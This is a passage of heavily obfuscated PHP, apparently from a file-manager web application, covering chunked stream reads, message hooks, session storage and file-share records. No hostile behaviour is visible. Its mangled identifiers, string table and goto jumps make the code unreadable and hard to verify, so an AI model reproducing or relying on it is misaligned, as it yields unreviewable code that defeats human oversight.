fileSubstr($çäúËØ, $ßÔØäÈ² = 0, $ãæÌ«ı× = -1) { $ì»Ø³š =& $_SERVER[¹Éµ„ºå]; $óáÇìŒü = $this->info($çäúËØ); if (!$óáÇìŒü || !$óáÇìŒü[$ì»Ø³š[232]] && $óáÇìŒü[$ì»Ø³š[79]] > 1024 * 1024 * 10) { return !1; } if ($ãæÌ«ı× === -1) { $ãæÌ«ı× = $óáÇìŒü[$ì»Ø³š[79]]; } if ($ãæÌ«ı× == 0) { return $ì»Ø³š[12]; } $¨îÄ¢îş = array($ì»Ø³š[1801] . $ßÔØäÈ² . $ì»Ø³š[879] . ($ßÔØäÈ² + $ãæÌ«ı× - 1)); $Õ÷ÉÚ»æ = url_request($çäúËØ, $ì»Ø³š[1595], !1, $¨îÄ¢îş, !1, !1, 30); return $Õ÷ÉÚ»æ[$ì»Ø³š[1381]] ? $Õ÷ÉÚ»æ[$ì»Ø³š[1381]] : $ì»Ø³š[12]; } public function download($ Ë¶ï¦, $éÃá‚»Ê) { Downloader::start($ Ë¶ï¦, $éÃá‚»Ê); return $éÃá‚»Ê; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($íù©îèØ, $Œúé¿É = '') { $this->info = $this->info($íù©îèØ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹Éµ„ºå][87]]; $this->pathOpen = $íù©îèØ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$íù©îèØ])) { self::$_chunkBuffer[$íù©îèØ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($›áê¡Á) { $ŒÇòÅ¸ê = $this->fileSubstr($this->pose, $›áê¡Á); $this->pose += strlen($ŒÇòÅ¸ê); return $ŒÇòÅ¸ê; } public function stream_tell() { return $this->pose; } public function stream_seek($”Ü˜­Ô¸, $çÃ›ÌøÕ) { $µŠÃ¼©Ó =& $_SERVER[¹Éµ„ºå]; if ($çÃ›ÌøÕ == SEEK_SET) { $this->pose = $”Ü˜­Ô¸; } else { if ($çÃ›ÌøÕ == SEEK_CUR) { $this->pose += $”Ü˜­Ô¸; } else { if ($çÃ›ÌøÕ == SEEK_END) { $this->pose = $this->info[$µŠÃ¼©Ó[79]] + intval($”Ü˜­Ô¸); } } } if ($”Ü˜­Ô¸ < 0) { $this->pose = $this->info[$µŠÃ¼©Ó[79]] + $”Ü˜­Ô¸; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹Éµ„ºå][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ËüÈ¼¢, $Ï·Û¹ŒÌ) { $àáó£ =& $_SERVER[¹Éµ„ºå]; $Şµ‘ë‚» = $this->info($ËüÈ¼¢); return array($àáó£[1501] => 0, $àáó£[1802] => 0, $àáó£[16] => 32768 + 511, $àáó£[1803] => 0, $àáó£[1804] => 0, $àáó£[1805] => 0, $àáó£[1806] => 0, $àáó£[79] => $Şµ‘ë‚»[$àáó£[79]], $àáó£[1807] => $Şµ‘ë‚»[$àáó£[1652]], $àáó£[1764] => $Şµ‘ë‚»[$àáó£[88]], $àáó£[1763] => $Şµ‘ë‚»[$àáó£[231]], $àáó£[1808] => 0, $àáó£[1809] => 0); } static $fileInfo = array(); public function info($—ğšÂ„Ä) { $úî‚Úš­ = $_SERVER[¹Éµ„ºå][1810]; if (isset(self::$fileInfo[$—ğšÂ„Ä])) { return self::$fileInfo[$—ğšÂ„Ä]; } if (substr($—ğšÂ„Ä, 0, strlen($úî‚Úš­)) != $úî‚Úš­) { return !1; } self::$fileInfo[$—ğšÂ„Ä] = IO::info(substr($—ğšÂ„Ä, strlen($úî‚Úš­))); return self::$fileInfo[$—ğšÂ„Ä]; } public static function read($­‘—Îû¢, $ÏğŒÄ½İ, $Ñå¥½ï÷) { if (!isset(self::$_fopenCache[$­‘—Îû¢])) { $É££ˆ†ç = new StreamWrapperIO(); $É££ˆ†ç->stream_open($­‘—Îû¢); self::$_fopenCache[$­‘—Îû¢] = $É££ˆ†ç; } $É££ˆ†ç = self::$_fopenCache[$­‘—Îû¢]; return $É££ˆ†ç->fileSubstr($ÏğŒÄ½İ, $Ñå¥½ï÷); } public static function _read($ÃÛ›î—, $»ô´ôŒû, $“‘Â±èØ) { $ï¥¦ê =& $_SERVER[¹Éµ„ºå]; $Š´ì´ŞÂ = fopen($ÃÛ›î—, $ï¥¦ê[1656]); if (!$Š´ì´ŞÂ) { return $ï¥¦ê[12]; } $Çã…ÁÅÒ = 8192; fseek($Š´ì´ŞÂ, $»ô´ôŒû, SEEK_SET); $–òò…¼ø = $ï¥¦ê[12]; $Ö§Íí”‚ = 0; while ($Ö§Íí”‚ < $“‘Â±èØ) { $¥·óí÷ç = min($Çã…ÁÅÒ, $“‘Â±èØ - $Ö§Íí”‚); $–òò…¼ø .= fread($Š´ì´ŞÂ, $¥·óí÷ç); $Ö§Íí”‚ += $¥·óí÷ç; } fclose($Š´ì´ŞÂ); return $–òò…¼ø; } public function fileSubstr($Àûëá, $ï¨’ğß¾) { $­Ø¦øÅÜ =& $_SERVER[¹Éµ„ºå]; $æ”îãÅŞ = $this->info[$­Ø¦øÅÜ[79]]; $àÉ¡ĞÊÙ = $Àûëá; $µƒ–µ  = $ï¨’ğß¾; if ($Àûëá < 0) { $Àûëá = $æ”îãÅŞ + $Àûëá; } if ($ï¨’ğß¾ === !1) { $ï¨’ğß¾ = $æ”îãÅŞ - $Àûëá; } if ($Àûëá + $ï¨’ğß¾ > $æ”îãÅŞ) { $ï¨’ğß¾ = $æ”îãÅŞ - $Àûëá; } if ($ï¨’ğß¾ <= 0) { return $­Ø¦øÅÜ[12]; } if ($Àûëá < 0 || $Àûëá >= $æ”îãÅŞ || $ï¨’ğß¾ <= 0 || $ï¨’ğß¾ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\x6c\145\122\x65\x61\144\40\145\x72\162\157\x72\x21\40\x73\x74\x61\162\x74\75{$Àûëá}\x3b\154\x65\156\x67\164\x68\x3d{$ï¨’ğß¾}\73\40\x73\x69\x7a\145\75{$æ”îãÅŞ}\73"); } $„•¾†„‰ = 64 * 1024; $ÒŠß–†å =& self::$_chunkBuffer[$this->path]; if (!$ÒŠß–†å) { $ÒŠß–†å = array(); } $ÄÈ®À«¢ = 0; $¨ÔÙ­Î = 0; $éŒ¾òÈ = $­Ø¦øÅÜ[12]; foreach ($ÒŠß–†å as $ÄÈ®À«¢ => $éŒ¾òÈ) { $ÄÈ®À«¢ = intval($ÄÈ®À«¢); $¨ÔÙ­Î = $ÄÈ®À«¢ + strlen($éŒ¾òÈ); if ($Àûëá >= $¨ÔÙ­Î) { continue; } if ($Àûëá >= $ÄÈ®À«¢ && $Àûëá + $ï¨’ğß¾ <= $¨ÔÙ­Î) { return substr($éŒ¾òÈ, $Àûëá - $ÄÈ®À«¢, $ï¨’ğß¾); } break; } if (count($ÒŠß–†å) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($­Ø¦øÅÜ[1811], $­Ø¦øÅÜ[1812] . count($ÒŠß–†å) . "\x3b\x73\164\141\162\x74\x3d{$Àûëá}\54\x6c\145\156\147\x74\150\75{$ï¨’ğß¾}\73\160\157\x73\145\72{$ÄÈ®À«¢}\176{$¨ÔÙ­Î}"); throw new Exception($­Ø¦øÅÜ[1813]); } $ªàäÛŠ‹ = intval($Àûëá / $„•¾†„‰) * $„•¾†„‰; $€ÃĞœÙ½ = ceil(($Àûëá + $ï¨’ğß¾) / $„•¾†„‰) * $„•¾†„‰ - $ªàäÛŠ‹; $’Ìšİœ¿ = IO::fileSubstr($this->path, $ªàäÛŠ‹, $€ÃĞœÙ½); $ÒŠß–†å[$ªàäÛŠ‹ . $­Ø¦øÅÜ[12]] = $’Ìšİœ¿; ksort($ÒŠß–†å); $ã„ØĞ¥º = substr($’Ìšİœ¿, $Àûëá - $ªàäÛŠ‹, $ï¨’ğß¾); return $ã„ØĞ¥º; } private function log($Àö„–İ, $“õ˜ÒË«) { $úƒÖùØô =& $_SERVER[¹Éµ„ºå]; $â¾¢õê = timeFloat() - $this->timeStart; write_log(sprintf($úƒÖùØô[1814], $Àö„–İ, $this->info[$úƒÖùØô[32]], $â¾¢õê, $“õ˜ÒË«), $úƒÖùØô[1360]); } } class Message { function __construct() { } public function send($ÌÓÊø×ñ = '', $¬š­øøö = array(), $ªŞÕøË§ = "\x74\x65\170\164") { $‹’âÒ¦â =& $_SERVER[¹Éµ„ºå]; $å…äÆ»² = array($‹’âÒ¦â[33] => $‹’âÒ¦â[1280], $‹’âÒ¦â[168] => $ÌÓÊø×ñ); if (in_array($ªŞÕøË§, array($‹’âÒ¦â[1280], $‹’âÒ¦â[1815]))) { $å…äÆ»²[$‹’âÒ¦â[33]] = $ªŞÕøË§; } $¬š­øøö = array($‹’âÒ¦â[598] => isset($¬š­øøö[$‹’âÒ¦â[598]]) ? $¬š­øøö[$‹’âÒ¦â[598]] : $‹’âÒ¦â[12], $‹’âÒ¦â[684] => isset($¬š­øøö[$‹’âÒ¦â[684]]) ? $¬š­øøö[$‹’âÒ¦â[684]] : $‹’âÒ¦â[12]); if (empty($ÌÓÊø×ñ) || empty($¬š­øøö[$‹’âÒ¦â[598]]) && empty($¬š­øøö[$‹’âÒ¦â[684]])) { return !1; } $¬â†¸¸Ò = array($‹’âÒ¦â[1744] => $å…äÆ»², $‹’âÒ¦â[1816] => $¬š­øøö); Hook::trigger($‹’âÒ¦â[1817], $¬â†¸¸Ò); } } goto B‚¨ö‘ï‡; Dè’æÜŠô: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\x73\145\163\x73\151\x6f\156"; public function get($¥ü‡ÀˆÆ) { $±­ë»ÉÚ =& $_SERVER[¹Éµ„ºå]; $‹äÊá®­ = $this->where(array($±­ë»ÉÚ[2308] => $¥ü‡ÀˆÆ))->find(); if (!is_array($‹äÊá®­)) { return !1; } return $‹äÊá®­[$±­ë»ÉÚ[168]]; } public function set($¡êöÓ‰, $¢‡éîÆ, $©ØÀÍ‹è = 3600) { $ÑğºåÌÍ =& $_SERVER[¹Éµ„ºå]; $ö”îÍïº = array($ÑğºåÌÍ[2308] => $¡êöÓ‰, $ÑğºåÌÍ[2211] => $¢‡éîÆ, $ÑğºåÌÍ[2309] => $©ØÀÍ‹è + time()); if (Session::get($ÑğºåÌÍ[2310])) { $ö”îÍïº[$ÑğºåÌÍ[1582]] = Session::get($ÑğºåÌÍ[2310]); } else { $ö”îÍïº[$ÑğºåÌÍ[1582]] = 0; } if ($this->get($¡êöÓ‰)) { return $this->where(array($ÑğºåÌÍ[2308] => $¡êöÓ‰))->save($ö”îÍïº); } else { return $this->add($ö”îÍïº, array(), !0); } } public function remove($Â²ı …) { return $this->where(array($_SERVER[¹Éµ„ºå][2308] => $Â²ı …))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹Éµ„ºå][2311] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\x54\151\x6d\x65", "\x74\x69\155\x65", "\151\156\163\x65\x72\x74\54\x75\160\x64\x61\x74\x65", "\x66\165\156\143\164\x69\x6f\x6e"), array("\x63\162\145\x61\x74\x65\124\x69\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\x65\162\164", "\146\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x6f\x70\164\151\157\156\163", '', "\x69\x6e\x73\145\162\x74\54\165\x70\144\x61\x74\145\54\163\145\154\x65\x63\x74", "\152\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ë¹Í²™ñ) { $£´¢ê—ê =& $_SERVER[¹Éµ„ºå]; return array($£´¢ê—ê[2312] => array(USER_ID, $£´¢ê—ê[2313]), $£´¢ê—ê[2314] => array($ë¹Í²™ñ[0], $£´¢ê—ê[2315])); } protected function ___listSimple() { $ÚÃÒÕƒÃ = $this->field($this->fieldList)->where(array($_SERVER[¹Éµ„ºå][1582] => USER_ID))->select(); return $ÚÃÒÕƒÃ ? $ÚÃÒÕƒÃ : array(); } protected function ___getInfoShare($¾Ÿ¯²ø¡) { return $this->_getShareInfo(array($_SERVER[¹Éµ„ºå][687] => $¾Ÿ¯²ø¡), !1); } protected function getInfo($„¨²Ê‹ò) { $ÛİÔÒÆÜ = $this->getInfoShare($„¨²Ê‹ò); return $this->shareSourceInfo($ÛİÔÒÆÜ); } public function getInfoByHash($‘Öô¶Ñ¿) { return $this->_getShareInfo(array($_SERVER[¹Éµ„ºå][1544] => $‘Öô¶Ñ¿)); } public function getInfoByPath($­‰‹ëô) { $µğãŸß =& $_SERVER[¹Éµ„ºå]; $ Ñ¨Å¯Á = array($µğãŸß[1582] => USER_ID, $µğãŸß[191] => $­‰‹ëô); return $this->_getShareInfo($ Ñ¨Å¯Á); } public function getInfoBySourcePath($Û°·ù²‘) { $İ·°˜£À =& $_SERVER[¹Éµ„ºå]; $ÃÌË„Ö = array($İ·°˜£À[1582] => USER_ID, $İ·°˜£À[583] => $Û°·ù²‘); return $this->_getShareInfo($ÃÌË„Ö); } private function _getShareInfo($œ‚ı«éŠ, $çÒÆë“² = true) { $—çĞ“˜Ä =& $_SERVER[¹Éµ„ºå]; $ø¹ºí‡Ñ = $this->where($œ‚ı«éŠ)->find(); if (!$ø¹ºí‡Ñ) { return !1; } if (!is_array($ø¹ºí‡Ñ[$—çĞ“˜Ä[580]])) { $ø¹ºí‡Ñ[$—çĞ“˜Ä[580]] = array(); } $œ‚ı«éŠ = array($—çĞ“˜Ä[687] => $ø¹ºí‡Ñ[$—çĞ“˜Ä[687]]); $È‰±÷¥ş = $—çĞ“˜Ä[2316]; $ø¹ºí‡Ñ[$—çĞ“˜Ä[1540]] = Model($—çĞ“˜Ä[688])->order($—çĞ“˜Ä[487])->field($È‰±÷¥ş)->where($œ‚ı«éŠ)->select(); if (!$çÒÆë“²) { return $ø¹ºí‡Ñ; } return $this->shareSourceInfo($ø¹ºí‡Ñ); } private function shareSourceInfo($²ÀÀ–çŸ) { $¸÷šÄê =& $_SERVER[¹Éµ„ºå]; if (!is_array($²ÀÀ–çŸ)) { return $²ÀÀ–çŸ; } if ($²ÀÀ–çŸ[$¸÷šÄê[191]] == $¸÷šÄê[228]) { $²ÀÀ–çŸ[$¸÷šÄê[90]] = IO::info($²ÀÀ–çŸ[$¸÷šÄê[583]]); } else { $²ÀÀ–çŸ[$¸÷šÄê[90]] = Model($¸÷šÄê[1523])->pathInfo($²ÀÀ–çŸ[$¸÷šÄê[191]]); } return $²ÀÀ–çŸ; } protected function getInfoAuth($à«‹òæÙ) { $›”Ñ¶Œá =& $_SERVER[¹Éµ„ºå]; $ğ™Ê°± = $this->getInfo($à«‹òæÙ); if ($ğ™Ê°±[$›”Ñ¶Œá[1582]] == USER_ID) { $ğ™Ê°±[$›”Ñ¶Œá[502]] = $ğ™Ê°±[$›”Ñ¶Œá[90]][$›”Ñ¶Œá[502]]; } else { $ğ™Ê°±[$›”Ñ¶Œá[502]] = Model($›”Ñ¶Œá[587])->authMake($ğ™Ê°±[$›”Ñ¶Œá[1540]]); } return $ğ™Ê°±; } protected function listData($Ö×Üà± = null, $ü“´ïÁï = 300) { $ä×œ÷µå =& $_SERVER[¹Éµ„ºå]; $”ØØ„¸Ã = array(array($ä×œ÷µå[578] => array($ä×œ÷µå[1169], 0), $ä×œ÷µå[685] => array($ä×œ÷µå[1169], 0), $ä×œ÷µå[2317] => $ä×œ÷µå[2273])); if ($Ö×Üà± == $ä×œ÷µå[2318]) { $”ØØ„¸Ã = array($ä×œ÷µå[578] => 1); } else { if ($Ö×Üà± == $ä×œ÷µå[1336]) { $”ØØ„¸Ã = array($ä×œ÷µå[685] => 1); } } $”ØØ„¸Ã[$ä×œ÷µå[1582]] = USER_ID; $Ôèñºìñ = $this->where($”ØØ„¸Ã)->selectPage($ü“´ïÁï); return $Ôèñºìñ; } protected function listToMe($Ûßş·Àì = 300) { $Êâ»•Æ =& $_SERVER[¹Éµ„ºå]; $úßœ¹Ó = Model($Êâ»•Æ[2319])->userGroupParents(USER_ID); $¤™Ÿ¡ãª = array($Êâ»•Æ[670] => SourceModel::TYPE_USER, $Êâ»•Æ[589] => USER_ID); if ($úßœ¹Ó) { $¤™Ÿ¡ãª = array(array($Êâ»•Æ[670] => SourceModel::TYPE_USER, $Êâ»•Æ[589] => USER_ID), array($Êâ»•Æ[670] => SourceModel::TYPE_GROUP, $Êâ»•Æ[589] => array($Êâ»•Æ[7], $úßœ¹Ó)), $Êâ»•Æ[2317] => $Êâ»•Æ[2273]); } $´ıÔâ÷Ğ = Model($Êâ»•Æ[688])->field($Êâ»•Æ[687])->where($¤™Ÿ¡ãª)->select(); $´ıÔâ÷Ğ = array_unique(array_to_keyvalue($´ıÔâ÷Ğ, $Êâ»•Æ[12], $Êâ»•Æ[687])); $¤™Ÿ¡ãª = array($Êâ»•Æ[687] => array($Êâ»•Æ[507], $´ıÔâ÷Ğ)); if (!$´ıÔâ÷Ğ) { return array($Êâ»•Æ[446] => array(), $Êâ»•Æ[443] => array($Êâ»•Æ[2320] => 0, $Êâ»•Æ[428] => 1)); } $ÌÆƒõºÀ = Model($Êâ»•Æ[688])->where($¤™Ÿ¡ãª)->select(); $ÌÆƒõºÀ = array_to_keyvalue_group($ÌÆƒõºÀ, $Êâ»•Æ[687]); $–±Æ¿¦ = $Êâ»•Æ[2321]; $’Ş¦Åõ = $this->field($–±Æ¿¦)->where($¤™Ÿ¡ãª)->selectPage($Ûßş·Àì); foreach ($’Ş¦Åõ[$Êâ»•Æ[446]] as $ªÇ¥×â => &$õ´ùÈá‹) { $õ´ùÈá‹[$Êâ»•Æ[1540]] = $ÌÆƒõºÀ[$õ´ùÈá‹[$Êâ»•Æ[687]]]; } unset($õ´ùÈá‹); return $’Ş¦Åõ; } protected function shareAdd($Ä“ÄÒ÷, $€Š‚ª¤) { $ßè±ò£ =& $_SERVER[¹Éµ„ºå]; $¡—ñûÁİ = $this->_addShareData($Ä“ÄÒ÷, $€Š‚ª¤); if (!empty($€Š‚ª¤[$ßè±ò£[2322]])) { $this->_shareAuthSet($¡—ñûÁİ, $€Š‚ª¤[$ßè±ò£[2322]]); } $this->shareEventAdd($Ä“ÄÒ÷, $€Š‚ª¤, $ßè±ò£[2323]); return $¡—ñûÁİ; } protected function shareAddSystem($¬ÜŒ‘ë±, $¾®ä¡Ÿø) { $©ã¯ö†  =& $_SERVER[¹Éµ„ºå]; $Ëñå…µë = $this->_addShareData($¬ÜŒ‘ë±, $¾®ä¡Ÿø, $©ã¯ö† [189]); $this->_shareAuthSet($Ëñå…µë, $¾®ä¡Ÿø[$©ã¯ö† [2322]]); return $Ëñå…µë; } private function shareEventAdd($ê£ßÓó, $ñõ„ŞÅó, $úõûè©‹ = "\141\x64\x64") { $Â¡²áºû =& $_SERVER[¹Éµ„ºå]; if (!$ê£ßÓó || $ê£ßÓó == $Â¡²áºû[228]) { return; } if ($úõûè©‹ == $Â¡²áºû[2323]) { if ($ñõ„ŞÅó[$Â¡²áºû[578]] == $Â¡²áºû[91]) { Model($Â¡²áºû[655])->eventShare($ê£ßÓó, $Â¡²áºû[2324]); } if ($ñõ„ŞÅó[$Â¡²áºû[685]] == $Â¡²áºû[91]) { Model($Â¡²áºû[655])->eventShare($ê£ßÓó, $Â¡²áºû[2325]); } return; } $·„Öàö = $this->getInfoByPath($ê£ßÓó); $‰ªÑ¿Çü = $Â¡²áºû[2326]; if ($·„Öàö[$Â¡²áºû[578]] == $Â¡²áºû[228] && $ñõ„ŞÅó[$Â¡²áºû[578]] == $Â¡²áºû[91]) { $‰ªÑ¿Çü = $Â¡²áºû[2324]; } if ($·„Öàö[$Â¡²áºû[578]] == $Â¡²áºû[91] && $ñõ„ŞÅó[$Â¡²áºû[578]] == $Â¡²áºû[228]) { $‰ªÑ¿Çü = $Â¡²áºû[2327]; } if ($·„Öàö[$Â¡²áºû[685]] == $Â¡²áºû[228] && $ñõ„ŞÅó[$Â¡²áºû[685]] == $Â¡²áºû[91]) { $‰ªÑ¿Çü = $Â¡²áºû[2325]; } if ($·„Öàö[$Â¡²áºû[685]] == $Â¡²áºû[91] && $ñõ„ŞÅó[$Â¡²áºû[685]] == $Â¡²áºû[228]) { $‰ªÑ¿Çü = $Â¡²áºû[2328]; } Model($Â¡²áºû[655])->eventShare($ê£ßÓó, $‰ªÑ¿Çü); return; } private function _addShareData($Í¦àÙÂƒ, $şÚ§ˆ°® = array(), $ş¸Â¯Ûü = false) { $À›­·ñó =& $_SERVER[¹Éµ„ºå]; $Øãáâñ = $ş¸Â¯Ûü == $À›­·ñó[189] ? 0 : USER_ID; $ ŒÃµÙŸ = array($À›­·ñó[506] => $Í¦àÙÂƒ, $À›­·ñó[1956] => $Øãáâñ); if ($Í¦àÙÂƒ == 0) { $ ŒÃµÙŸ = array($À›­·ñó[2329] => $şÚ§ˆ°®[$À›­·ñó[583]], $À›­·ñó[1956] => $Øãáâñ); } if ($‡¼Äş…„ = $this->where($ ŒÃµÙŸ)->find()) { return $‡¼Äş…„[$À›­·ñó[687]]; } if ($Í¦àÙÂƒ == 0) { $äÉıÆ²– = array($À›­·ñó[32] => get_path_this($şÚ§ˆ°®[$À›­·ñó[87]])); } else { $äÉıÆ²– = Model($À›­·ñó[924])->sourceInfo($Í¦àÙÂƒ); if (!$äÉıÆ²–) { return !1; } } if (!$şÚ§ˆ°®[$À›­·ñó[1854]]) { $şÚ§ˆ°®[$À›­·ñó[1854]] = $äÉıÆ²–[$À›­·ñó[32]]; } $¼Øñş•ü = array($À›­·ñó[1956] => $Øãáâñ, $À›­·ñó[506] => $Í¦àÙÂƒ, $À›­·ñó[1854] => $À›­·ñó[12], $À›­·ñó[578] => 0, $À›­·ñó[685] => 0, $À›­·ñó[583] => $À›­·ñó[12], $À›­·ñó[382] => $À›­·ñó[12], $À›­·ñó[1043] => $À›­·ñó[12], $À›­·ñó[2330] => 0, $À›­·ñó[2331] => 0, $À›­·ñó[853] => 0, $À›­·ñó[580] => $À›­·ñó[12], $À›­·ñó[1544] => $À›­·ñó[12]); $Ìø§ßØŠ = explode($À›­·ñó[50], $À›­·ñó[2332]); foreach ($Ìø§ßØŠ as $îªôÂÈÒ) { if (!isset($şÚ§ˆ°®[$îªôÂÈÒ])) { continue; } $¼Øñş•ü[$îªôÂÈÒ] = $şÚ§ˆ°®[$îªôÂÈÒ]; } $¤ÉŸ†ôà = $this->add($¼Øñş•ü); $¿Œ¿ª×± = array($À›­·ñó[1544] => short_id($¤ÉŸ†ôà)); if ($this->where($¿Œ¿ª×±)->find()) { $¿Œ¿ª×±[$À›­·ñó[1544]] .= $À›­·ñó[476] . rand_string(2, 3); } $this->where(array($À›­·ñó[2333] => $¤ÉŸ†ôà))->save($¿Œ¿ª×±); return $¤ÉŸ†ôà; } private function _shareAuthSet($Ï…¦æ’, $à¥ñ½Ş) { $ç¨Îµ—¥ =& $_SERVER[¹Éµ„ºå]; if (!is_array($à¥ñ½Ş)) { return !1; } $ĞÔâÍá¢ = Model($ç¨Îµ—¥[2282]); $ĞÔâÍá¢->where(array($ç¨Îµ—¥[687] => $Ï…¦æ’))->delete(); $Ó²ŸÜ…± = array(); foreach ($à¥ñ½Ş as $ñà¨ŠÜú) { $à¬£Çİî = SourceModel::TYPE_USER; if ($ñà¨ŠÜú[$ç¨Îµ—¥[188]] == SourceModel::TYPE_GROUP) { $à¬£Çİî = SourceModel::TYPE_GROUP; } $¶ñ‹×ƒ¸ = array($ç¨Îµ—¥[687] => $Ï…¦æ’, $ç¨Îµ—¥[188] => $à¬£Çİî, $ç¨Îµ—¥[589] => intval($ñà¨ŠÜú[$ç¨Îµ—¥[589]]), $ç¨Îµ—¥[1630] => 0, $ç¨Îµ—¥[2334] => -1); if ($ñà¨ŠÜú[$ç¨Îµ—¥[1630]]) { $¶ñ‹×ƒ¸[$ç¨Îµ—¥[1630]] = $ñà¨ŠÜú[$ç¨Îµ—¥[1630]]; } else { if ($ñà¨ŠÜú[$ç¨Îµ—¥[2334]]) { $¶ñ‹×ƒ¸[$ç¨Îµ—¥[2334]] = $ñà¨ŠÜú[$ç¨Îµ—¥[2334]]; } } $Ó²ŸÜ…±[] = $¶ñ‹×ƒ¸; } return $ĞÔâÍá¢->addAll($Ó²ŸÜ…±, array(), !0); } public function numViewAdd($’Ö‡á®‹) { $ö¨Ïß¢» =& $_SERVER[¹Éµ„ºå]; $ãå£¾¿¬ = array($ö¨Ïß¢»[2333] => $’Ö‡á®‹); $this->where($ãå£¾¿¬)->setAdd($ö¨Ïß¢»[2330]); } public function numDownloadAdd($ş¨öÍ) { $òÔ‚Ãà´ =& $_SERVER[¹Éµ„ºå]; $®í³Á÷ = array($òÔ‚Ãà´[2333] => $ş¨öÍ); $this->where($®í³Á÷)->setAdd($òÔ‚Ãà´[2331]); } protected function shareEdit($ñÒæàñÁ, $¤âİ¾Ğ) { $Ø—Ôã½Ä =& $_SERVER[¹Éµ„ºå]; $×Òß·ÍÎ = $this->getInfo($ñÒæàñÁ); if (!$×Òß·ÍÎ) { return !1; } if ($¤âİ¾Ğ[$Ø—Ôã½Ä[1544]] && $¤âİ¾Ğ[$Ø—Ôã½Ä[578]] == $Ø—Ôã½Ä[91]) { if ($¤âİ¾Ğ[$Ø—Ôã½Ä[1544]] == $×Òß·ÍÎ[$Ø—Ôã½Ä[1544]]) { unset($¤âİ¾Ğ[$Ø—Ôã½Ä[1544]]); } if ($¤âİ¾Ğ[$Ø—Ôã½Ä[1544]]) { $Ñäêäê = $this->where(array($Ø—Ôã½Ä[2335] => $¤âİ¾Ğ[$Ø—Ôã½Ä[1544]]))->find(); if ($Ñäêäê) { return !1; } if (!is_array($¤âİ¾Ğ[$Ø—Ôã½Ä[580]])) { $¤âİ¾Ğ[$Ø—Ôã½Ä[580]] = is_array($×Òß·ÍÎ[$Ø—Ôã½Ä[580]]) ? $×Òß·ÍÎ[$Ø—Ôã½Ä[580]] : array(); } if (!$¤âİ¾Ğ[$Ø—Ôã½Ä[580]][$Ø—Ôã½Ä[2336]]) { $¤âİ¾Ğ[$Ø—Ôã½Ä[580]][$Ø—Ôã½Ä[2336]] = $×Òß·ÍÎ[$Ø—Ôã½Ä[1544]]; $¤âİ¾Ğ[$Ø—Ôã½Ä[580]][$Ø—Ôã½Ä[2337]] = $Ø—Ôã½Ä[91]; } } } $this->_checkLinkShare($¤âİ¾Ğ, $×Òß·ÍÎ); $†…è»Ãâ = array(); $ïéƒ¸ëß = explode($Ø—Ôã½Ä[50], $Ø—Ôã½Ä[2338]); foreach ($ïéƒ¸ëß as $°‚¦Ñ®è) { if (!array_key_exists($°‚¦Ñ®è, $¤âİ¾Ğ)) { continue; } $†…è»Ãâ[$°‚¦Ñ®è] = $¤âİ¾Ğ[$°‚¦Ñ®è]; } $this->shareEventAdd($×Òß·ÍÎ[$Ø—Ôã½Ä[191]], $¤âİ¾Ğ, $Ø—Ôã½Ä[1551]); $this->where(array($Ø—Ôã½Ä[2333] => $ñÒæàñÁ))->save($†…è»Ãâ); if (isset($¤âİ¾Ğ[$Ø—Ôã½Ä[2322]])) { $this->_shareAuthSet($ñÒæàñÁ, $¤âİ¾Ğ[$Ø—Ôã½Ä[2322]]); } return !0; } private function _checkLinkShare($ÄèéÁû, $«ôˆ¢ó) { $…­ê¡Ä± =& $_SERVER[¹Éµ„ºå]; if ($ÄèéÁû[$…­ê¡Ä±[578]] != $…­ê¡Ä±[91]) { return; } $“ËÑ×Û­ = $«ôˆ¢ó[$…­ê¡Ä±[90]][$…­ê¡Ä±[191]]; if ($«ôˆ¢ó[$…­ê¡Ä±[90]][$…­ê¡Ä±[33]] != $…­ê¡Ä±[230]) { $©ëÀø„± = $this->_folderReport($“ËÑ×Û­); if (!$©ëÀø„±) { return; } show_json(LNG($…­ê¡Ä±[2339]) . $…­ê¡Ä±[2340] . $©ëÀø„±, !1); } $Çˆôô‡Ş = Model($…­ê¡Ä±[924])->fileInfoGet($«ôˆ¢ó[$…­ê¡Ä±[90]][$…­ê¡Ä±[191]]); if (!$Çˆôô‡Ş) { return; } $û¼™‹Õ— = $this->shareFileMeta($Çˆôô‡Ş[$…­ê¡Ä±[557]]); if (isset($û¼™‹Õ—[$…­ê¡Ä±[451]]) && $û¼™‹Õ—[$…­ê¡Ä±[451]] == $…­ê¡Ä±[91]) { show_json(LNG($…­ê¡Ä±[2341]), !1); } } private function _folderReport($šÇèØ¶) { $…Ëàá•ä =& $_SERVER[¹Éµ„ºå]; $¿ƒçàÖÎ = array($…Ëàá•ä[557] => array($…Ëàá•ä[1169], 0), $…Ëàá•ä[841] => 3); $òÆúàÂÌ = Model($…Ëàá•ä[2342])->where($¿ƒçàÖÎ)->field($…Ëàá•ä[557])->select(); if (!$òÆúàÂÌ) { return !1; } $òÆúàÂÌ = array_to_keyvalue($òÆúàÂÌ, $…Ëàá•ä[12], $…Ëàá•ä[557]); $ËØêİ“Œ = $…Ëàá•ä[50] . $šÇèØ¶ . $…Ëàá•ä[50]; $¿ƒçàÖÎ = array($…Ëàá•ä[557] => array($…Ëàá•ä[7], $òÆúàÂÌ), $…Ëàá•ä[604] => array($…Ëàá•ä[473], "\x25{$ËØêİ“Œ}\45"), $…Ëàá•ä[520] => 0); $æ¸Å‘¾€ = Model($…Ëàá•ä[924])->where($¿ƒçàÖÎ)->field($…Ëàá•ä[2343])->find(); if (!$æ¸Å‘¾€) { return !1; } 